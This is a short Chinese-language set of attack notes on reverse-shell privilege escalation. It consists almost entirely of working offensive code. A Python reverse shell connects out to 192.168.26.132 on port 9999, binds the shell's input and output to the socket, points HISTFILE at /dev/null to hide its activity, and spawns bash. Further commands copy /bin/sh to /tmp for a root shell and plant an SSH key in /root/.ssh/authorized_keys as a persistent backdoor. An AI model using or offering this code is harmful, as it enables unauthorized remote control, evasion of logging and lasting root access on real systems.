反弹shell提权

def con():
import socket, time,pty, os
host=’192.168.26.132’
port=9999
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(10)
s.connect((host,port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv(“HISTFILE”,’/dev/null’)
pty.spawn(“/bin/bash”)
s.close()
con()

创建root可执行程序权限

os.system(‘cp /bin/sh /tmp/ry’)

mkdir /root/.ssh; chmod 775 /root/.ssh; echo “加上 id_rsa.pub产生的密匙内容上图有例子” > /root/.ssh/authorized_keys
